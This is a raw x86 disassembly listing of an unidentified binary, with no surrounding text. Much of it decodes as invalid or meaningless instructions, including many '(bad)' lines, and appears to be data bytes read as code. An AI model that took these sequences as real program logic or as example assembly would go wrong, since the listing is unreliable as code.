  4121cf:	and    DWORD PTR [eax],eax
  4121d1:	add    BYTE PTR [eax],al
  4121d3:	add    bl,al
  4121d5:	mov    edx,0xacbd029a
  4121da:	xchg   BYTE PTR [eax],dl
  4121dc:	mov    esi,0xba1f8aaf
  4121e1:	test   eax,0x9eb32284
  4121e6:	ja     0x4121ff
  4121e8:	mov    eax,0x682a5
	...
  4121f5:	add    BYTE PTR [eax],al
  4121f7:	add    BYTE PTR [eax-0x46b3d2a3],cl
  4121fd:	mov    ds:0xfafeff86,al
  412202:	stc    
  412203:	(bad)  
  412204:	cld    
  412205:	repnz in al,dx
  412207:	(bad)  
  412208:	sti    
  412209:	out    0xdc,eax
  41220b:	(bad)  
  41220c:	stc    
  41220d:	fcmove st,st(2)
  41220f:	(bad)  
  412210:	fdiv   DWORD PTR [edx+0x6490ff96]
  412216:	xor    eax,0x6185a8b4
  41221b:	sub    edi,DWORD PTR [esi+0x285a1]
  412221:	add    BYTE PTR [eax],al
  412223:	add    BYTE PTR [ebp-0x47fd6a48],bh
  412229:	stos   DWORD PTR es:[edi],eax
  41222a:	adc    DWORD PTR [eax],0xffffffba
  41222d:	scas   al,BYTE PTR es:[edi]
  41222e:	xchg   DWORD PTR [edi],ebx
  412230:	mov    dh,0xa8
  412232:	and    DWORD PTR [edx],0x17759eb0
  412238:	mov    ch,0xa5
  41223a:	add    BYTE PTR [esi],0x0
	...
  412245:	add    BYTE PTR [eax],al
  412247:	add    BYTE PTR [ecx-0x44b3d2a2],cl
  41224d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41224e:	mov    bh,bh
  412250:	(bad)  
  412251:	(bad)  
  412252:	(bad)  
  412253:	(bad)  
  412254:	(bad)  
  412255:	sti    
  412256:	cli    
  412257:	(bad)  
  412258:	std    
  412259:	repz out dx,al
  41225b:	(bad)  
  41225c:	fnstcw WORD PTR [edi+0x628cfaa9]
  412262:	xor    ebp,DWORD PTR [edx+0x1f6286a8]
	...
  412270:	mov    bh,0xb8
  412272:	nop
  412273:	add    ah,BYTE PTR [esi-0x60d8ab77]
  412279:	push   0x2b
  41227b:	xchg   DWORD PTR [edx-0x472fa676],esi
  412281:	xchg   esp,eax
  412282:	push   0xffffffe0
  412284:	mov    al,ds:0x97ac366f
  412289:	ins    BYTE PTR es:[edi],dx
  41228a:	ss dec eax
  41228c:	mov    cl,0xa2
  41228e:	jg     0x412298
	...
  412298:	mov    DWORD PTR [esi+0x2e],ebx
  41229b:	dec    esp
  41229c:	mov    esp,0xffff8da6
  4122a1:	(bad)  
  4122a2:	(bad)  
  4122a3:	(bad)  
  4122a4:	(bad)  
  4122a5:	(bad)  
  4122a6:	(bad)  
  4122a7:	jmp    eax
  4122a9:	rol    edi,cl
  4122ab:	dec    DWORD PTR [esi-0x5955c69a]
  4122b1:	test   BYTE PTR [ecx+0x21],ah
	...
  4122c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4122c1:	test   DWORD PTR [edi+0x1e],ecx
  4122c4:	fwait
  4122c5:	ins    DWORD PTR es:[edi],dx
  4122c6:	xor    eax,0x8eabc395
  4122cb:	out    0xe3,al
  4122cd:	fcmove st,st(7)
  4122cf:	cld    
  4122d0:	call   0xd440feb7
  4122d5:	ret    
  4122d6:	mov    cl,0xf4
  4122d8:	mov    al,ds:0x90bd567d
  4122dd:	ins    BYTE PTR es:[edi],dx
  4122de:	cmp    eax,0x83a5b34c
  4122e3:	pop    es
  4122e4:	add    BYTE PTR [eax],al
  4122e6:	add    BYTE PTR [eax],al
  4122e8:	mov    DWORD PTR [edi+0x2f],ebx
  4122eb:	dec    esp
  4122ec:	mov    ebp,0xffff8fa8
  4122f1:	(bad)  
  4122f2:	(bad)  
  4122f3:	(bad)  
  4122f4:	(bad)  
  4122f6:	(bad)  
  4122f7:	jmp    DWORD PTR [esi-0x5b009c7a]
  4122fd:	sbb    DWORD PTR [esi+ebx*4-0x43],0xbf7f89a3
  412305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412306:	mov    edi,DWORD PTR [edi-0x3e]
  412309:	test   eax,0xb0c77f91
  41230e:	pushf  
  41230f:	adc    eax,0x752a699c
  412314:	les    ebp,FWORD PTR [esi-0x141a0e6e]
  41231a:	jecxz  0x41231b
  41231c:	ret    0xc3e3
  41231f:	jmp    FWORD PTR [edx-0x19005428]
  412325:	icebp  
  412326:	in     eax,0xff
  412328:	(bad)  
  41232a:	(bad)  
  41232b:	cli    
  41232c:	popf   
  41232d:	jns    0x41237f
  41232f:	mov    ecx,0x2b6d94a8
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    DWORD PTR [edi+0x2f],ebx
  41233b:	dec    esp
  41233c:	mov    esi,0xdeff91a9
  412341:	rol    esi,cl
  412343:	inc    edx
  412345:	lods   eax,DWORD PTR ds:[esi]
  412346:	xchg   ebp,eax
  412347:	(bad)  
  412348:	fst    st(1)
  41234a:	ret    
  41234b:	jmp    edi
  41234d:	(bad)  
  41234f:	jmp    edi
  412351:	(bad)  
  412353:	jmp    edi
  412355:	(bad)  
  412357:	dec    eax
  412359:	mov    dl,0x9b
  41235b:	inc    esi
  41235d:	scas   eax,DWORD PTR es:[edi]
  41235e:	fwait
  41235f:	sub    ch,BYTE PTR [edi-0x1e33a979]
  412365:	loopne 0x412344
  412367:	push   DWORD PTR [eax+0x48ffb6e2]
  41236d:	mov    ebp,0x9c19ff4c
  412372:	sbb    al,0xff
  412374:	imul   edi,DWORD PTR [edx-0xa110093],0xffffffec
  41237b:	dec    eax
  41237d:	mov    ah,0x9f
  41237f:	repnz scas eax,DWORD PTR es:[edi]
  412381:	mov    al,ds:0x4d7c
  412386:	add    BYTE PTR [eax],al
  412388:	mov    bl,BYTE PTR [edi+0x2f]
  41238b:	dec    esp
  41238c:	mov    ds:0xacff6486,eax
  412391:	xchg   esp,eax
  412392:	jnp    0x412393
  412394:	mov    ebx,0xc8ffa2ac
  412399:	mov    edi,0xc0c9ffbd
  41239e:	mov    esi,0xbec0c9ff
  4123a3:	dec    ecx
  4123a5:	sar    BYTE PTR [esi-0x6b574101],0xff
  4123ac:	(bad)  
  4123ad:	mov    dl,0x9f
  4123af:	sub    bh,BYTE PTR [edi-0x1c10825f]
  4123b5:	jmp    0xff92:0xdc8dffeb
  4123bc:	dec    edx
  4123bd:	iret   
  4123be:	dec    esi
  4123bf:	push   DWORD PTR [ecx+edi*4]
  4123c2:	cmp    bh,bh
  4123c4:	das    
  4123c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123c6:	xor    bh,bh
  4123c8:	xlat   BYTE PTR ds:[ebx]
  4123c9:	in     al,dx
  4123ca:	fdivr  st,st(7)
  4123cc:	fcmovnbe st,st(0)
  4123ce:	ret    
  4123cf:	(bad)  
  4123d0:	mov    eax,0x5490af
  4123d5:	add    BYTE PTR [eax],al
  4123d7:	add    BYTE PTR [edx-0x48b9bf94],dl
  4123dd:	lahf   
  4123de:	cmp    edi,0xffffffd0
  4123e1:	lds    edi,FWORD PTR [ebp-0x4d4b4001]
  4123e7:	(bad)  
  4123e8:	mov    edi,0xbfffb2b4
  4123ed:	mov    ah,0xb2
  4123ef:	(bad)  
  4123f0:	mov    edi,0xbfffb2b4
  4123f5:	mov    ah,0xb2
  4123f7:	(bad)  
  4123f8:	mov    ebx,0xc8ff90a4
  4123fd:	mov    ch,0xa3
  4123ff:	sub    dh,BYTE PTR [esp+ecx*4-0x1e1f31a4]
  412406:	(bad)  
  412408:	scas   al,BYTE PTR es:[edi]
  412409:	in     al,0xb6
  41240b:	jmp    DWORD PTR [ebp-0x28]
  41240e:	imul   edi,edi,0xff53cf4f
  412414:	jns    0x4123e2
  412416:	jl     0x412417
  412418:	out    0xef,eax
  41241a:	out    0xff,eax
  41241c:	retf   0xa0b6
  41241f:	repz mov cl,0xa4
  412422:	or     DWORD PTR [ebp+0x0],0xba000000
  412429:	mov    al,0x93
  41242b:	sub    dl,al
  41242d:	mov    ebp,0xd9dfffa9
  412432:	fdivr  st,st(7)
  412434:	mov    edi,0xbfffb2b4
  412439:	mov    ah,0xb2
  41243b:	(bad)  
  41243c:	mov    edi,0xbfffb2b4
  412441:	mov    ah,0xb2
  412443:	(bad)  
  412444:	mov    edi,0xbbffb2b4
  412449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41244a:	nop
  41244b:	inc    edi
  41244d:	mov    ch,0xa4
  41244f:	sub    ah,BYTE PTR [ebp-0x3782d191]
  412455:	mov    bl,0x97
  412457:	neg    ebx
  412459:	out    0xe0,eax
  41245b:	(bad)  
  41245c:	mov    ebx,0xacffc3e6
  412461:	loop   0x412416
  412463:	call   edi
  412465:	in     al,dx
  412466:	(bad)  
  412468:	(bad)  
  41246a:	retf   0xa7fc
  41246d:	adc    DWORD PTR [ebp-0x41],0x2d6e98a9
  412474:	add    BYTE PTR [eax],al
  412476:	add    BYTE PTR [eax],al
  412478:	mov    eax,0xd02a92af
  41247d:	mov    ebp,0xecefffa9
  412482:	jmp    0x412483
  412484:	(bad)  
  412486:	fdivr  st,st(7)
  412488:	(bad)  
  41248a:	fdivr  st,st(7)
  41248c:	(bad)  
  41248e:	fdivr  st,st(7)
  412490:	(bad)  
  412492:	fdivr  st,st(7)
  412494:	(bad)  
  412496:	fdivr  st,st(7)
  412498:	lds    esi,FWORD PTR [ecx-0x4b390064]
  41249e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41249f:	sub    ah,BYTE PTR [edi-0x57dea26a]
  4124a5:	jne    0x4124de
  4124a7:	popf   
  4124a8:	lds    ebp,FWORD PTR [esp+ecx*4-0x322a2410]
  4124af:	jmp    eax
  4124b1:	(bad)  
  4124b3:	dec    edi
  4124b5:	shr    BYTE PTR [ebx+edi*8-0x37a97a54],0x9e
  4124bd:	jl     0x412507
  4124bf:	push   ecx
  4124c0:	mov    al,0xac
  4124c2:	mov    BYTE PTR [edi],al
  4124c4:	add    BYTE PTR [eax],al
  4124c6:	add    BYTE PTR [eax],al
  4124c8:	mov    bh,0xb1
  4124ca:	xchg   ebx,eax
  4124cb:	sub    al,al
  4124cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ce:	(bad)  
  4124cf:	call   eax
  4124d1:	mov    ebp,0xbdd0ffa9
  4124d6:	test   eax,0xa9bdd0ff
  4124db:	call   eax
  4124dd:	mov    ebp,0xbdd0ffa9
  4124e2:	test   eax,0xa9bdd0ff
  4124e7:	inc    eax
  4124e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124ea:	(bad)  
  4124eb:	inc    ebp
  4124ed:	mov    ah,0xa4
  4124ef:	sub    ch,BYTE PTR [ebp-0x56fe6e40]
  4124f5:	cdq    
  4124f6:	pusha  
  4124f7:	and    DWORD PTR [edx-0x5085d996],esp
  4124fd:	or     DWORD PTR [edx-0x3a],0xd85a8bb3
  412504:	lahf   
  412505:	imul   ebp,DWORD PTR [eax+eiz*4],0xffffff9f
  412509:	js     0x412549
  41250b:	ds mov al,0xb0
  41250e:	mov    DWORD PTR [edi],eax
	...
  412518:	mov    bh,0xb7
  41251a:	call   0xc12a:0x99b2bd07
  412521:	mov    al,0x9b
  412523:	sub    al,cl
  412525:	lods   eax,DWORD PTR ds:[esi]
  412526:	cwde   
  412527:	sub    al,al
  412529:	lods   al,BYTE PTR ds:[esi]
  41252a:	cwde   
  41252b:	sub    al,bl
  41252d:	mov    al,0x9d
  41252f:	sub    al,bl
  412531:	mov    al,0x9d
  412533:	sub    al,ah
  412535:	mov    cl,0xa0
  412537:	sub    al,bh
  412539:	mov    dh,0xa7
  41253b:	sub    cl,al
  41253d:	mov    eax,0xfe0007ac
  412542:	adc    BYTE PTR [eax],al
  412544:	add    BYTE PTR [esi+0x0],bh
  412547:	add    BYTE PTR [eax],al
  412549:	dec    esp
  41254a:	add    BYTE PTR [eax],al
  41254c:	add    BYTE PTR [eax+eax*1+0x0],al
  412550:	add    BYTE PTR [eax+0x10],al
  412553:	add    BYTE PTR [eax],al
  412555:	inc    eax
  412556:	xor    BYTE PTR [eax],al
  412558:	add    BYTE PTR [eax+0x0],al
  41255b:	add    BYTE PTR [eax],al
  41255d:	inc    eax
  41255e:	add    BYTE PTR [eax],al
  412560:	add    al,al
  412562:	add    BYTE PTR [eax],al
  412564:	add    eax,0xc0810000
  41256a:	xor    BYTE PTR [eax],al
  41256c:	add    al,al
  41256e:	jo     0x412570
  412570:	add    BYTE PTR [eax+0x0],al
  412573:	add    BYTE PTR [eax],al
  412575:	inc    eax
  412576:	add    BYTE PTR [eax],al
  412578:	add    BYTE PTR [eax+0x0],al
  41257b:	add    BYTE PTR [eax],al
  41257d:	inc    eax
  41257e:	add    BYTE PTR [eax],al
  412580:	add    BYTE PTR [eax+0x0],al
  412583:	add    BYTE PTR [eax],al
  412585:	inc    eax
  412586:	add    BYTE PTR [eax],al
  412588:	add    BYTE PTR [eax+0x0],al
  41258b:	add    BYTE PTR [eax],al
  41258d:	rol    BYTE PTR [eax],0x0
  412590:	sub    BYTE PTR [eax],al
  412592:	add    BYTE PTR [eax],al
  412594:	adc    BYTE PTR [eax],al
  412596:	add    BYTE PTR [eax],al
  412598:	and    BYTE PTR [eax],al
  41259a:	add    BYTE PTR [eax],al
  41259c:	add    DWORD PTR [eax],eax
  41259e:	and    BYTE PTR [eax],al
  4125a0:	add    BYTE PTR [eax],al
  4125a2:	add    BYTE PTR [eax],al
  4125a4:	inc    eax
  4125a5:	add    al,0x0
	...
  4125e3:	add    BYTE PTR [esi-0x79a8a481],bl
  4125e9:	pop    edx
  4125ea:	daa    
  4125eb:	inc    DWORD PTR [ebp-0x6100daa8]
  4125f1:	jg     0x41264e
  4125f3:	push   edi
	...
  4125fc:	sahf   
  4125fd:	jg     0x41265a
  4125ff:	push   edi
  412600:	adc    BYTE PTR [ebp+0x21],0xff
  412604:	scas   eax,DWORD PTR es:[edi]
  412605:	xchg   ecx,eax
  412606:	jo     0x412607
  412608:	adc    BYTE PTR [ebp+0x21],0xff
  41260c:	sahf   
  41260d:	jg     0x41266a
  41260f:	push   edi
	...
  412624:	mov    DWORD PTR [esi+0x2e],ebx
  412627:	(bad)  
  412628:	clc    
  412629:	fcmovb st,st(7)
  41262b:	(bad)  
  41262c:	clc    
  41262d:	aad    0xc2
  41262f:	inc    DWORD PTR [ebp+0xff2658]
  412635:	add    BYTE PTR [eax],al
  412637:	add    BYTE PTR [esi-0x5da8a481],bl
  41263d:	sbb    DWORD PTR [edi+edi*8-0x2e],0xfdffb6c5
  412645:	std    
  412646:	std    
  412647:	(bad)  
  412648:	fxch   st(4)
  41264a:	mov    esp,0x6085a6ff
  41264f:	call   FWORD PTR [esi+0x575b7f]
  412655:	add    BYTE PTR [eax],al
  412657:	add    BYTE PTR [ecx+0xff3f6b],dl
  41265d:	add    BYTE PTR [eax],al
  41265f:	add    BYTE PTR [eax],al
  412661:	add    BYTE PTR [eax],al
  412663:	add    BYTE PTR [ebx-0x500cc9e],cl
  412669:	fmulp  st(6),st
  41266b:	dec    DWORD PTR [eax-0x6100d3a4]
  412671:	jg     0x4126ce
  412673:	push   edi
  412674:	add    BYTE PTR [eax],al
  412676:	add    BYTE PTR [eax],al
  412678:	adc    BYTE PTR [ebp+0x21],0xff
  41267c:	iret   
  41267d:	ret    
  41267e:	mov    bl,0xff
  412680:	icebp  
  412681:	repz repz (bad) 
  412684:	sti    
  412685:	cld    
  412686:	cld    
  412687:	(bad)  
  412688:	std    
  412689:	std    
  41268a:	std    
  41268b:	(bad)  
  41268c:	fxch   st(4)
  41268e:	mov    esp,0x215582ff
  412693:	inc    DWORD PTR [eax]
  412695:	add    BYTE PTR [eax],al
  412697:	add    BYTE PTR [ebx-0x6e00bb92],dl
  41269d:	imul   eax,DWORD PTR [eax-0x1],0xffffff8f
  4126a1:	push   0xe8fbff3b
  4126a6:	fdiv   st(7),st
  4126a8:	sti    
  4126a9:	jecxz  0x412680
  4126ab:	dec    DWORD PTR [edx-0x6100cfa0]
  4126b1:	jg     0x41270e
  4126b3:	xor    BYTE PTR [eax],al
  4126b5:	add    BYTE PTR [eax],al
  4126b7:	add    BYTE PTR [ebx-0x1e009979],ah
  4126bd:	in     eax,0xe5
  4126bf:	jmp    ebx
  4126c1:	out    0xe7,eax
  4126c3:	jmp    edi
  4126c5:	icebp  
  4126c6:	jmp    0xf6371aca
  4126cb:	push   esi
  4126cd:	div    edi
  4126cf:	jmp    FWORD PTR [ebp+0xff6e90]
  4126d5:	add    BYTE PTR [eax],al
  4126d7:	add    BYTE PTR [ebp-0x200b68f],dl
  4126dd:	cmc    
  4126de:	lock (bad) 
  4126e0:	std    
  4126e1:	repnz jmp 0x8dff:0xe3ecfcff
  4126e9:	gs cmp bh,bh
  4126ec:	sahf   
  4126ed:	jg     0x41274a
  4126ef:	push   edi
	...
  4126f8:	adc    BYTE PTR [ebp+0x21],0xff
  4126fc:	ret    
  4126fd:	mov    ecx,0xe5e1ffa9
  412702:	in     eax,0xff
  412704:	out    dx,eax
  412705:	icebp  
  412706:	icebp  
  412707:	push   ecx
  412709:	repz repz call edx
  41270d:	lds    esi,FWORD PTR [esi+0x215582ff]
  412713:	inc    DWORD PTR [eax]
  412715:	add    BYTE PTR [eax],al
  412717:	add    BYTE PTR [edi-0x100b28b],dl
  41271d:	stc    
  41271e:	idiv   bh
  412720:	(bad)  
  412721:	div    cl
  412723:	(bad)  
  412724:	std    
  412725:	icebp  
  412726:	jmp    0x412727
  412728:	sti    
  412729:	in     al,dx
  41272a:	jecxz  0x41272b
  41272c:	mov    fs,WORD PTR [esi+0x38]
  41272f:	dec    DWORD PTR [ebx+0xff3563]
  412735:	add    BYTE PTR [eax],al
  412737:	add    BYTE PTR [esi-0x63a8a481],bl
  41273d:	jl     0x412796
  41273f:	inc    ebx
  412741:	mov    ecx,0xefecffa9
  412746:	out    dx,eax
  412747:	dec    edi
  412749:	ret    
  41274a:	mov    bl,0xff
  41274c:	mov    ds:0x9eff5c81,al
  412751:	jg     0x4127ae
  412753:	push   edi
  412754:	add    BYTE PTR [eax],al
  412756:	add    BYTE PTR [eax],al
  412758:	cdq    
  412759:	js     0x4127ad
  41275b:	(bad)  
  41275c:	(bad)  
  41275d:	std    
  41275e:	sti    
  41275f:	(bad)  
  412760:	(bad)  
  412761:	cli    
  412762:	idiv   edi
  412764:	(bad)  
  412765:	div    cl
  412767:	(bad)  
  412768:	cld    
  412769:	icebp  
  41276a:	jmp    0x9eff:0x3d6a90ff
  412771:	jg     0x4127ce
  412773:	push   edi
	...
  41277c:	sahf   
  41277d:	jg     0x4127da
  41277f:	push   edi
  412780:	adc    BYTE PTR [ebp+0x21],0xff
  412784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412785:	mov    ebp,DWORD PTR [ecx-0x1]
  412788:	adc    BYTE PTR [ebp+0x21],0xff
  41278c:	sahf   
  41278d:	jg     0x4127ea
  41278f:	push   edi
	...
  412798:	fwait
  412799:	jnp    0x4127f0
  41279b:	(bad)  
  41279c:	(bad)  
  41279d:	(bad)  
  41279e:	(bad)  
  41279f:	(bad)  
  4127a0:	(bad)  
  4127a1:	cld    
  4127a2:	sti    
  4127a3:	(bad)  
  4127a4:	(bad)  
  4127a5:	stc    
  4127a6:	idiv   edi
  4127a8:	xchg   ebp,eax
  4127a9:	jo     0x4127f2
  4127ab:	call   FWORD PTR [esi+0x575b7f]
	...
  4127d5:	add    BYTE PTR [eax],al
  4127d7:	add    BYTE PTR [ebp-0xa782],bl
  4127dd:	(bad)  
  4127de:	(bad)  
  4127df:	(bad)  
  4127e0:	(bad)  
  4127e1:	(bad)  
  4127e2:	(bad)  
  4127e3:	call   FWORD PTR [eax-0x6100b089]
  4127e9:	jg     0x412846
  4127eb:	push   edi
	...
  4127fc:	sahf   
  4127fd:	jg     0x41285a
  4127ff:	push   edi
  412800:	adc    BYTE PTR [ebp+0x21],0xff
  412804:	scas   eax,DWORD PTR es:[edi]
  412805:	xchg   ecx,eax
  412806:	jo     0x412807
  412808:	adc    BYTE PTR [ebp+0x21],0xff
  41280c:	sahf   
  41280d:	jg     0x41286a
  41280f:	push   edi
	...
  412818:	sahf   
  412819:	jg     0x412876
  41281b:	(bad)  
  41281c:	(bad)  
  41281d:	(bad)  
  41281e:	(bad)  
  41281f:	call   FWORD PTR [ebx+edi*2+0x7f9eff56]
  412826:	pop    ebx
  412827:	push   edi
	...
  412838:	sahf   
  412839:	jg     0x412896
  41283b:	push   edi
  41283c:	mov    ds:0xd2ff5c81,al
  412841:	lds    esi,FWORD PTR [esi-0x2020201]
  412847:	(bad)  
  412848:	fxch   st(4)
  41284a:	mov    esp,0x6085a6ff
  41284f:	inc    DWORD PTR [edx+0x522155]
  412855:	add    BYTE PTR [eax],al
  412857:	add    BYTE PTR [esi-0x6100a481],bl
  41285d:	jg     0x4128ba
  41285f:	push   DWORD PTR [eax-0x46008c6d]
  412865:	popf   
  412866:	jg     0x412867
  412868:	mov    ecx,0xb9ff7f9d
  41286d:	popf   
  41286e:	jg     0x41286f
  412870:	mov    ecx,0xff7f9d
  412875:	add    BYTE PTR [eax],al
  412877:	add    BYTE PTR [edx-0x3000deab],al
  41287d:	ret    
  41287e:	mov    bl,0xff
  412880:	iret   
  412881:	out    0xd2,al
  412883:	jmp    DWORD PTR [eax-0x27006532]
  412889:	out    dx,al
  41288a:	(bad)  
  41288c:	fxch   st(4)
  41288e:	mov    esp,0x215582ff
  412893:	inc    DWORD PTR [eax]
  412895:	add    BYTE PTR [eax],al
  412897:	add    BYTE PTR [esi-0x2400a481],bl
  41289d:	into   
  41289e:	mov    edi,0xcecfd6ff
  4128a3:	call   esi
  4128a5:	iret   
  4128a6:	into   
  4128a7:	call   esi
  4128a9:	iret   
  4128aa:	into   
  4128ab:	call   esi
  4128ad:	iret   
  4128ae:	into   
  4128af:	(bad)  
  4128b0:	mov    ecx,0xff7f9d
  4128b5:	add    BYTE PTR [eax],al
  4128b7:	add    BYTE PTR [ebx-0x1e009979],ah
  4128bd:	in     eax,0xe5
  4128bf:	(bad)  
  4128c0:	jp     0x41287f
  4128c2:	ja     0x4128c3
  4128c4:	pop    ebx
  4128c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128c6:	dec    ebx
  4128c7:	call   DWORD PTR [ebp-0x9006e37]
  4128cd:	div    edi
  4128cf:	jmp    FWORD PTR [ebp+0xff6e90]
  4128d5:	add    BYTE PTR [eax],al
  4128d7:	add    BYTE PTR [ecx-0x8063],bh
  4128dd:	(bad)  
  4128de:	(bad)  
  4128df:	(bad)  
  4128e0:	mov    edi,0xbfffb2b4
  4128e5:	mov    ah,0xb2
  4128e7:	(bad)  
  4128e8:	mov    edi,0xbfffb2b4
  4128ed:	mov    ah,0xb2
  4128ef:	(bad)  
  4128f0:	mov    ecx,0xff7f9d
  4128f5:	add    BYTE PTR [eax],al
  4128f7:	add    BYTE PTR [edx-0x3c00deab],al
  4128fd:	mov    ecx,0xd6aeffa9
  412902:	mov    bl,0xff
  412904:	mov    es,ebp
  412906:	mov    edi,edi
  412908:	ret    0xc5e1
  41290b:	call   edx
  41290d:	lds    esi,FWORD PTR [esi+0x215582ff]
  412913:	inc    DWORD PTR [eax]
  412915:	add    BYTE PTR [eax],al
  412917:	add    BYTE PTR [ecx-0x8063],bh
  41291d:	(bad)  
  41291e:	(bad)  
  41291f:	call   esi
  412921:	iret   
  412922:	into   
  412923:	call   esi
  412925:	iret   
  412926:	into   
  412927:	call   esi
  412929:	iret   
  41292a:	into   
  41292b:	call   esi
  41292d:	iret   
  41292e:	into   
  41292f:	(bad)  
  412930:	mov    ecx,0xff7f9d
  412935:	add    BYTE PTR [eax],al
  412937:	add    BYTE PTR [esi-0x63a8a481],bl
  41293d:	jl     0x412996
  41293f:	inc    ebx
  412941:	mov    ecx,0xefecffa9
  412946:	out    dx,eax
  412947:	dec    edi
  412949:	ret    
  41294a:	mov    bl,0xff
  41294c:	mov    ds:0x9eff5c81,al
  412951:	jg     0x4129ae
  412953:	push   edi
  412954:	add    BYTE PTR [eax],al
  412956:	add    BYTE PTR [eax],al
  412958:	mov    ecx,0xb9ff7f9d
  41295d:	popf   
  41295e:	jg     0x41295f
  412960:	mov    ecx,0xb9ff7f9d
  412965:	popf   
  412966:	jg     0x412967
  412968:	mov    ecx,0xb9ff7f9d
  41296d:	popf   
  41296e:	jg     0x41296f
  412970:	mov    ecx,0xff7f9d
  412975:	add    BYTE PTR [eax],al
  412977:	add    BYTE PTR [eax],al
  412979:	add    BYTE PTR [eax],al
  41297b:	add    BYTE PTR [esi-0x7da8a481],bl
  412981:	push   ebp
  412982:	and    edi,edi
  412984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412985:	mov    ebp,DWORD PTR [ecx-0x1]
  412988:	adc    BYTE PTR [ebp+0x21],0xff
  41298c:	mov    dl,0x99
  41298e:	jge    0x412919
	...
  4129b8:	jmp    ecx
  4129ba:	add    BYTE PTR [eax],al
  4129bc:	and    ecx,0x0
  4129bf:	add    BYTE PTR [ecx],al
  4129c1:	popa   
  4129c2:	add    BYTE PTR [eax],al
  4129c4:	add    DWORD PTR [ecx],eax
  4129c6:	add    BYTE PTR [eax],al
  4129c8:	add    DWORD PTR [ebx],eax
  4129ca:	add    BYTE PTR [eax],al
  4129cc:	add    DWORD PTR [ecx],eax
  4129ce:	add    BYTE PTR [eax],al
  4129d0:	add    DWORD PTR [ecx],eax
  4129d2:	add    BYTE PTR [eax],al
  4129d4:	add    DWORD PTR [ebx],0x0
  4129d7:	add    bh,bh
  4129d9:	pop    es
  4129da:	add    BYTE PTR [eax],al
  4129dc:	or     DWORD PTR [edi],0x0
  4129df:	add    BYTE PTR [ecx],al
  4129e1:	add    DWORD PTR [eax],eax
  4129e3:	add    BYTE PTR [ecx],al
  4129e5:	add    DWORD PTR [eax],eax
  4129e7:	add    BYTE PTR [ecx],al
  4129e9:	add    DWORD PTR [eax],eax
  4129eb:	add    BYTE PTR [ecx],al
  4129ed:	add    DWORD PTR [eax],eax
  4129ef:	add    BYTE PTR [ecx],al
  4129f1:	add    DWORD PTR [eax],eax
  4129f3:	add    BYTE PTR [ebx+0xff],al
  4129f9:	add    BYTE PTR [ecx],al
  4129fb:	add    BYTE PTR [esi],cl
  4129fd:	add    BYTE PTR [eax],ah
  4129ff:	and    BYTE PTR [eax],dl
  412a01:	add    BYTE PTR [ecx],al
  412a03:	add    BYTE PTR [eax+eax*1],al
  412a06:	call   0x1412a0d
  412a0b:	add    BYTE PTR [eax],dl
  412a0d:	adc    BYTE PTR [eax],dl
  412a0f:	add    BYTE PTR [ecx],al
  412a11:	add    BYTE PTR [eax+eax*1],al
  412a14:	sub    BYTE PTR [ecx],al
  412a16:	add    BYTE PTR [eax],al
  412a18:	add    al,BYTE PTR [eax]
  412a1a:	xor    BYTE PTR [eax],dh
  412a1c:	add    BYTE PTR [eax],al
  412a1e:	add    DWORD PTR [eax],eax
  412a20:	or     BYTE PTR [eax],al
  412a22:	test   al,0xe
  412a24:	add    BYTE PTR [eax],al
  412a26:	add    eax,DWORD PTR [eax]
  412a28:	sub    BYTE PTR [eax],ch
  412a2a:	add    BYTE PTR [eax],al
  412a2c:	add    DWORD PTR [eax],eax
  412a2e:	or     BYTE PTR [eax],al
  412a30:	test   al,0xb
  412a32:	add    BYTE PTR [eax],al
  412a34:	add    al,0x0
  412a36:	and    BYTE PTR [eax],ah
  412a38:	add    BYTE PTR [eax],al
  412a3a:	add    DWORD PTR [eax],eax
  412a3c:	or     BYTE PTR [eax],al
  412a3e:	test   al,0x8
  412a40:	add    BYTE PTR [eax],al
  412a42:	add    eax,0x181800
  412a47:	add    BYTE PTR [ecx],al
  412a49:	add    BYTE PTR [eax],cl
  412a4b:	add    al,cl
  412a4d:	push   es
  412a4e:	add    BYTE PTR [eax],al
  412a50:	push   es
  412a51:	add    BYTE PTR [esp+edx*1],dl
  412a54:	add    BYTE PTR [eax],al
  412a56:	add    DWORD PTR [eax],eax
  412a58:	or     BYTE PTR [eax],al
  412a5a:	or     BYTE PTR [esi],al
  412a5c:	add    BYTE PTR [eax],al
  412a5e:	pop    es
  412a5f:	add    BYTE PTR [eax],dl
  412a61:	adc    BYTE PTR [eax],al
  412a63:	add    BYTE PTR [ecx],al
  412a65:	add    BYTE PTR [eax],cl
  412a67:	add    BYTE PTR [eax+0x5],ch
  412a6a:	add    BYTE PTR [eax],al
  412a6c:	or     BYTE PTR [eax],al
  412a6e:	xor    BYTE PTR [eax],dh
  412a70:	add    BYTE PTR [eax],al
  412a72:	add    DWORD PTR [eax],eax
  412a74:	and    BYTE PTR [eax],al
  412a76:	test   al,0x25
  412a78:	add    BYTE PTR [eax],al
  412a7a:	or     DWORD PTR [eax],eax
  412a7c:	sub    BYTE PTR [eax],ch
  412a7e:	add    BYTE PTR [eax],al
  412a80:	add    DWORD PTR [eax],eax
  412a82:	and    BYTE PTR [eax],al
  412a84:	push   0xa00001a
  412a89:	add    BYTE PTR [eax],ah
  412a8b:	and    BYTE PTR [eax],al
  412a8d:	add    BYTE PTR [ecx],al
  412a8f:	add    BYTE PTR [eax],ah
  412a91:	add    BYTE PTR [eax+0xb000010],ch
  412a97:	add    BYTE PTR [eax],bl
  412a99:	sbb    BYTE PTR [eax],al
  412a9b:	add    BYTE PTR [ecx],al
  412a9d:	add    BYTE PTR [eax],ah
  412a9f:	add    BYTE PTR [eax+0xc000009],cl
  412aa5:	add    BYTE PTR [esp+edx*1],dl
  412aa8:	add    BYTE PTR [eax],al
  412aaa:	add    DWORD PTR [eax],eax
  412aac:	and    BYTE PTR [eax],al
